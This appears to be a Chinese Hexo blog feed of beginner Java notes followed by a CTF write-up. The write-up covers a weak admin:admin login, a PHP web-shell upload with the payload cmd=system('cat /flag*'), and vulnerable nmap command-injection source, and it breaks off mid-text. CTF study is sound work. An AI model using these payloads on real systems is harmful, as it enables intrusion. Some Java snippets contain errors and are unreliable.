class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123; </span><br><span class="line">        <span class="keyword">switch</span> ( <span class="comment">/* 表达式 */</span> )&#123; </span><br><span class="line">        <span class="keyword">case</span> <span class="comment">/* 值 1 */</span>: </span><br><span class="line">        <span class="comment">// 当表达式取得的值符合值 1 执行此段代码 </span></span><br><span class="line">                <span class="keyword">break</span>; </span><br><span class="line">        <span class="comment">// 如果不加上 break 语句,会让程序按顺序往下执行直到break         </span></span><br><span class="line">        <span class="keyword">case</span> <span class="comment">/* 值 2 */</span>: <span class="comment">// 当表达式取得的值符合值 2 执行此段代码 </span></span><br><span class="line">                <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">default</span>: <span class="comment">// 当表达式不符合上面列举的值的时候执行这里面的代码 </span></span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><ul><li>while</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123; </span><br><span class="line">        <span class="keyword">while</span> ( <span class="comment">/* 判定条件 */</span> ) &#123; </span><br><span class="line">        <span class="comment">// 条件成立时执行循环体内代码 </span></span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>do…while<br>&#96;</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123; </span><br><span class="line">        <span class="keyword">do</span> &#123; <span class="comment">// 需要执行的代码 &#125; while ( /* 循环判断条件 */ ); </span></span><br><span class="line">    &#125;         </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h6><p>**第一种</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123; </span><br><span class="line">        <span class="keyword">for</span> ( <span class="comment">/* 初始化 */</span>; <span class="comment">/* 循环的判断条件 */</span>; <span class="comment">/* 每次循环后执行的步骤 */</span> )&#123;</span><br><span class="line">         <span class="comment">// 当循环的条件成立执行循环体内代码 </span></span><br><span class="line">         &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>** 第二种</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">         <span class="comment">// 假设集合Z是一个数组 </span></span><br><span class="line">         <span class="type">int</span>[] arr = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;; </span><br><span class="line">         <span class="comment">// 使用增强型 for 循环遍历数组arr中的每一个元素 </span></span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> num : arr) &#123; </span><br><span class="line">              <span class="comment">// 这个语句块的每一次循环时，num 分别是数组 arr 中的一个元素。 </span></span><br><span class="line">              System.out.println(num); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个跟php的遍历数组一样</p>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-数据结构</title>
      <link href="/2024/09/11/java-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
      <url>/2024/09/11/java-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h5 id="标识符号定义"><a href="#标识符号定义" class="headerlink" title="标识符号定义"></a>标识符号定义</h5><ol><li>数字,字母，下划线 美元符号</li><li>数字不开头</li><li>长度不限</li><li>大小写敏感</li><li>保留字符以及特殊常亮</li></ol><table><thead><tr><th>类型名</th><th>意义</th></tr></thead><tbody><tr><td>boolean</td><td>布尔类型</td></tr><tr><td>byte</td><td>字节类型</td></tr><tr><td>char</td><td>字符型</td></tr><tr><td>double</td><td>双精度浮点</td></tr><tr><td>float</td><td>单精度浮点</td></tr><tr><td>int</td><td>整型</td></tr><tr><td>long</td><td>长整型</td></tr><tr><td>short</td><td>短整型</td></tr><tr><td>null</td><td>空</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">12</span>; <span class="comment">// 设置 a 为整数类型,并给 a 赋值为 12</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;Hello, OI-wiki&quot;</span>; <span class="comment">// 声明字符串变量 str char ch = &#x27;W&#x27;; </span></span><br><span class="line"><span class="type">double</span> <span class="variable">PI</span> <span class="operator">=</span> <span class="number">3.1415926</span>;</span><br></pre></td></tr></table></figure><h3 id="final-关键字"><a href="#final-关键字" class="headerlink" title="final 关键字"></a>final 关键字</h3><p><code>final</code> 含义是这是最终的、不可更改的结果，被 <code>final</code> 修饰的变量只能被赋值一次，赋值后不再改变。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">double</span> <span class="variable">PI</span> <span class="operator">=</span> <span class="number">3.1415926</span>;</span><br></pre></td></tr></table></figure><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 有十个元素的整数类型数组 </span></span><br><span class="line"><span class="comment">// 其语法格式为 数据类型[] </span></span><br><span class="line">变量名 = <span class="keyword">new</span> 数据类型[数组大小]</span><br><span class="line"><span class="type">int</span>[] ary = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span>[] num = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 最为简单的构造一个字符串变量的方法如下 </span></span><br><span class="line"><span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="comment">// 还可以使用字符数组构造一个字符串变量 </span></span><br><span class="line"><span class="type">char</span>[] stringArray = &#123; <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;o&#x27;</span> &#125;; </span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(stringArray);</span><br></pre></td></tr></table></figure><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><h3 id="1-自动类型转换（隐式类型转换）"><a href="#1-自动类型转换（隐式类型转换）" class="headerlink" title="1. 自动类型转换（隐式类型转换）"></a>1. 自动类型转换（隐式类型转换）</h3><p>自动类型转换发生在小范围数据类型（如 <code>byte</code>、<code>short</code>、<code>char</code>、<code>int</code> 等）的值被赋值给大范围数据类型（如 <code>long</code>、<code>float</code>、<code>double</code> 等）的变量时。这种转换是自动进行的，不需要程序员显式地指定。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">100</span>;  </span><br><span class="line"></span><br><span class="line"><span class="type">double</span> <span class="variable">doubleNum</span> <span class="operator">=</span> num;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自动类型转换</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在上面的例子中，<code>int</code> 类型的 <code>num</code> 被赋值给 <code>double</code> 类型的 <code>doubleNum</code> 变量，发生了自动类型转换。</p><h3 id="2-强制类型转换（显式类型转换）"><a href="#2-强制类型转换（显式类型转换）" class="headerlink" title="2. 强制类型转换（显式类型转换）"></a>2. 强制类型转换（显式类型转换）</h3><p>当试图将大范围数据类型的值赋给小范围数据类型的变量时，会发生数据丢失，因此 Java 不允许这种自动转换。但如果你确实需要这样做，可以通过强制类型转换来实现，但请注意这可能会导致数据丢失或精度降低。</p><p><strong>示例</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> <span class="variable">doubleNum</span> <span class="operator">=</span> <span class="number">100.99</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">intNum</span> <span class="operator">=</span> (<span class="type">int</span>)doubleNum;</span><br><span class="line"><span class="comment">// 强制类型转换  System.out.println(intNum);</span></span><br><span class="line"><span class="comment">// 输出 100</span></span><br><span class="line">采用 integer 类进行禁止的操作。</span><br><span class="line">String str＝<span class="string">&quot;string&quot;</span>;</span><br><span class="line"><span class="type">int</span> num= integer.parseint(s);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在上面的例子中，<code>double</code> 类型的 <code>doubleNum</code> 被强制转换为 <code>int</code> 类型的 <code>intNum</code>。由于 <code>int</code> 类型不能存储小数部分，因此 <code>doubleNum</code> 的小数部分被丢弃，只保留了整数部分。</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><p>在进行强制类型转换时，请确保转换是安全的，以避免数据丢失或意外的程序行为。</p></li><li><p>当在数值表达式中使用 <code>byte</code>、<code>short</code> 和 <code>char</code> 类型时，Java 会自动将它们提升为 <code>int</code> 类型。</p></li><li><p>使用强制类型转换时，通常建议在转换前检查数值是否在目标类型的表示范围内，以避免溢出。</p></li><li><p>在处理 <code>float</code> 和 <code>double</code> 类型时，请特别注意它们之间的自动类型转换可能导致精度损失（特别是从 <code>double</code> 转换为 <code>float</code>）。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-包和输入输出</title>
      <link href="/2024/09/11/java-%E5%8C%85%E5%92%8C%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/"/>
      <url>/2024/09/11/java-%E5%8C%85%E5%92%8C%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h3 id="包和导入包"><a href="#包和导入包" class="headerlink" title="包和导入包"></a>包和导入包</h3><p>Java 中的类（<code>Class</code>）都被放在一个个包（<code>package</code>）里面。在一个包里面不允许有同名的类。在类的第一行通常要说明这个类是属于哪个包的。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.oi-wiki.tutorial;</span><br></pre></td></tr></table></figure><p>包的命名规范一般是：<code>项目所有者的顶级域.项目所有者的二级域.项目名称</code>。</p><p>通过 <code>import</code> 关键字来导入不在本类所属的包下面的类。例如下面要用到的 <code>Scanner</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br></pre></td></tr></table></figure><p>如果想要导入某包下面所有的类，只需要把这个语句最后的分号前的类名换成 <code>*</code>。</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.oiwiki.tutorial; </span><br><span class="line"><span class="keyword">import</span> java.util.Scanner; </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123; </span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scan</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in); </span><br><span class="line">        <span class="comment">// System.in 是输入流 </span></span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> scan.nextInt(); </span><br><span class="line">        <span class="type">double</span> <span class="variable">b</span> <span class="operator">=</span> scan.nextDouble(); </span><br><span class="line">        <span class="type">String</span> <span class="variable">c</span> <span class="operator">=</span> scan.nextLine(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到java的输入和输出是不一样的</p><ol><li><p><strong><a href="http://system.in/">System.in</a> vs scanf</strong>:</p><ul><li><strong><a href="http://system.in/">System.in</a></strong>: 在Java中，<code>System.in</code> 是一个字节流（<code>InputStream</code>），它用于读取字节数据，而不是像 <code>scanf</code> 一样直接处理格式化的输入。因此，处理用户输入时，通常需要使用其他类（比如 <code>Scanner</code> 或者 <code>BufferedReader</code>）来将字节流转换为更易处理的形式（比如文本或者基本数据类型）。</li><li><strong>scanf</strong>: 在C语言中，<code>scanf</code> 是一个函数，它能够按照指定的格式从标准输入（通常是键盘）读取数据，并且可以将数据格式化为不同的数据类型（整数、浮点数、字符串等）。<code>scanf</code> 的格式化字符串允许精确地指定输入数据的格式，这使得它在处理格式化输入时非常方便。</li></ul></li><li><p><strong>Java的输入方式</strong>:</p><ul><li>在Java中，虽然没有像 <code>scanf</code> 那样直接的格式化输入函数，但是有几种方式可以实现类似的功能：<ul><li>使用 <code>Scanner</code> 类：<code>Scanner</code> 类可以从 <code>System.in</code> 中读取数据，并且提供了各种方法来解析不同数据类型（如整数、浮点数、字符串）。</li><li>使用 <code>BufferedReader</code> 和 <code>InputStreamReader</code>：这些类可以用于读取字符流，并且可以进行高效的文本处理，尤其适合处理大量输入。</li><li>使用 <code>Console</code> 类：Java 6 引入了 <code>Console</code> 类，它提供了一些基本的输入方法，但它的功能相对有限。</li></ul></li></ul></li></ol><h5 id="scanner"><a href="#scanner" class="headerlink" title="scanner"></a>scanner</h5><p>当你需要从用户输入数据时，Java中的 <code>Scanner</code> 类是一个非常常用且方便的工具。它可以帮助你从各种输入源（如 <code>System.in</code>，文件等）中读取数据，并且支持不同的数据类型。</p><h3 id="使用Scanner类进行输入"><a href="#使用Scanner类进行输入" class="headerlink" title="使用Scanner类进行输入"></a>使用Scanner类进行输入</h3><ol><li><p><strong>导入Scanner类</strong>： 在使用之前，首先需要导入 <code>java.util.Scanner</code> 包，因为 <code>Scanner</code> 类位于 <code>java.util</code> 包中。</p><p> javaCopy Code</p><p> <code>import java.util.Scanner;</code></p></li><li><p><strong>创建Scanner对象</strong>： 使用 <code>Scanner</code> 类来处理输入。通常，你会创建一个 <code>Scanner</code> 对象，并将其与特定的输入流（例如 <code>System.in</code>）相关联。</p><p> javaCopy Code</p><p> <code>Scanner scanner = new Scanner(System.in);</code></p><p> 这样就创建了一个可以从标准输入（通常是键盘）读取数据的 <code>Scanner</code> 对象。</p></li><li><p><strong>读取不同类型的输入</strong>： <code>Scanner</code> 类提供了多种方法来读取不同类型的数据。以下是一些常用的方法：</p><ul><li><strong>nextInt()</strong>：读取一个整数。</li><li><strong>nextDouble()</strong>：读取一个双精度浮点数。</li><li><strong>next()</strong>：读取一个字符串，遇到空格或换行符停止。</li><li><strong>nextLine()</strong>：读取一行输入，包括空格，直到换行符为止。</li></ul></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InputExample</span> &#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123; </span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in); </span><br><span class="line">        System.out.print(<span class="string">&quot;请输入一个整数：&quot;</span>); </span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> scanner.nextInt(); </span><br><span class="line">        System.out.println(<span class="string">&quot;你输入的整数是：&quot;</span> + num); </span><br><span class="line">        System.out.print(<span class="string">&quot;请输入一个双精度浮点数：&quot;</span>); </span><br><span class="line">        <span class="type">double</span> <span class="variable">doubleNum</span> <span class="operator">=</span> scanner.nextDouble();</span><br><span class="line">        System.out.println(<span class="string">&quot;你输入的双精度浮点数是：&quot;</span> + doubleNum);     </span><br><span class="line">        System.out.print(<span class="string">&quot;请输入一个字符串：&quot;</span>); </span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> scanner.next(); </span><br><span class="line">        System.out.println(<span class="string">&quot;你输入的字符串是：&quot;</span> + str); </span><br><span class="line">        System.out.print(<span class="string">&quot;请输入一行文本：&quot;</span>); </span><br><span class="line">        scanner.nextLine(); <span class="comment">// 清空输入缓冲区 </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> scanner.nextLine(); </span><br><span class="line">        System.out.println(<span class="string">&quot;你输入的文本是：&quot;</span> + line); </span><br><span class="line">        scanner.close(); <span class="comment">// 关闭输入流 </span></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="java输入和输出"><a href="#java输入和输出" class="headerlink" title="java输入和输出"></a>java输入和输出</h3><p>假设输入是：<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello World  Another Line</span><br></pre></td></tr></table></figure><br>如果先调用 <code>scanner.next()</code>，它会返回 <code>&quot;Hello&quot;</code>，并留下 <code>&quot; World\nAnother Line&quot;</code> 在输入中。紧接着调用 <code>scanner.nextLine()</code> 会返回 <code>&quot; World&quot;</code>（注意，没有换行符）。</p><p>如果先调用 <code>scanner.nextLine()</code>，它会返回 <code>&quot;Hello World&quot;</code>（包括空格但不包括换行符），紧接着调用 <code>scanner.nextLine()</code> 会返回 <code>&quot;Another Line&quot;</code>。</p><pre><code>**注意**：- 在读取完整行文本之前，可能需要调用 `scanner.nextLine()` 来清除输入缓冲区。- 使用完 `Scanner` 后，最好调用 `scanner.close()` 来释放资源，尤其是在程序结束时。</code></pre><h3 id="Scanner的灵活性与限制"><a href="#Scanner的灵活性与限制" class="headerlink" title="Scanner的灵活性与限制"></a>Scanner的灵活性与限制</h3><ul><li><strong>灵活性</strong>：<code>Scanner</code> 类提供了丰富的方法来处理各种类型的输入数据，可以满足大多数基本的输入需求。</li><li><strong>限制</strong>：对于复杂的输入处理（如格式化的输入），可能需要额外的逻辑来处理或者考虑使用其他输入方法（如 <code>BufferedReader</code>）。</li></ul><p>通过熟悉 <code>Scanner</code> 类及其方法，你可以有效地处理用户输入，并在程序中进行相应的逻辑操作和处理。</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>可以对变量进行格式化输出。</p><table><thead><tr><th>符号</th><th>意义</th></tr></thead><tbody><tr><td><code>%f</code></td><td>浮点类型</td></tr><tr><td><code>%s</code></td><td>字符串类型</td></tr><tr><td><code>%d</code></td><td>整数类型</td></tr><tr><td><code>%c</code></td><td>字符类型</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123; </span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">12</span>; </span><br><span class="line">        <span class="type">char</span> <span class="variable">b</span> <span class="operator">=</span> <span class="string">&#x27;A&#x27;</span>; </span><br><span class="line">        <span class="type">double</span> <span class="variable">s</span> <span class="operator">=</span> <span class="number">3.14</span>; </span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;Hello world&quot;</span>; </span><br><span class="line">        System.out.printf(<span class="string">&quot;%f\n&quot;</span>, s); </span><br><span class="line">        System.out.printf(<span class="string">&quot;%d\n&quot;</span>, a); </span><br><span class="line">        System.out.printf(<span class="string">&quot;%c\n&quot;</span>, b); </span><br><span class="line">        System.out.printf(<span class="string">&quot;%s\n&quot;</span>, str); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024-9-11-CTF</title>
      <link href="/2024/09/11/2024-9-11-CTF/"/>
      <url>/2024/09/11/2024-9-11-CTF/</url>
      
        <content type="html"><![CDATA[<h3 id="LitCTF-2023-作业管理系统"><a href="#LitCTF-2023-作业管理系统" class="headerlink" title="[LitCTF 2023]作业管理系统"></a>[LitCTF 2023]作业管理系统</h3><blockquote><p>交作业！！但是哪里不对？<br>出题人 探姬</p></blockquote><blockquote><p>第一眼 登陆框 必然是试一试 弱口令<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240715235151.png" alt="image.png"></p></blockquote><p>可以看到包是admin:admin的啊,之后在源代码也看到了 一个 admin admin 猜想没错<br>进入之后 很多功能点啊 </p><p>直接文件上传 php木马 没想到这么简单<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240715235500.png" alt="image.png"></p><h6 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">post参数</span><br><span class="line">cmd=system(&#x27;cat /flag*&#x27;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-认真你就输了"><a href="#BJDCTF2020-认真你就输了" class="headerlink" title="[BJDCTF2020]认真你就输了"></a>[BJDCTF2020]认真你就输了</h3><p>拿到了一个xls，一般这种办公软件里面第一步就是查一些字符串</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240726214723.png" alt="image.png"><br>果然第一条就看到一个flag.txt，同时我们知道其实这种xls的文件基本都是一些zip压缩包格式<br>你打开文件格式看看也会发现他就是个zip文件格式，修改成zip后缀之后就可以根据目录找到flag<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240726215110.png" alt="image.png"></p><h3 id="MRCTF2020-ezmisc"><a href="#MRCTF2020-ezmisc" class="headerlink" title="[MRCTF2020]ezmisc"></a>[MRCTF2020]ezmisc</h3><p>直接修改宽高，将高拉长<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240726222622.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240726222533.png" alt="image.png"></p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="variable">$host </span>= <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];   </span><br><span class="line">    <span class="variable">$host </span>= <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);   </span><br><span class="line">    <span class="variable">$host </span>= <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);  </span><br><span class="line">    <span class="variable">$sandbox </span>= <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;  </span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);  </span><br><span class="line">    <span class="keyword">echo</span><span class="title function_ invoke__"> system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">```text</span><br><span class="line">单引号 (&#x27;)：转义为 \&#x27;。</span><br><span class="line">双引号 (&quot;)：转义为 \&quot;。</span><br><span class="line">反斜杠 (\)：转义为 \\。</span><br><span class="line">美元符号 ($)：转义为 \$。</span><br><span class="line">反引号 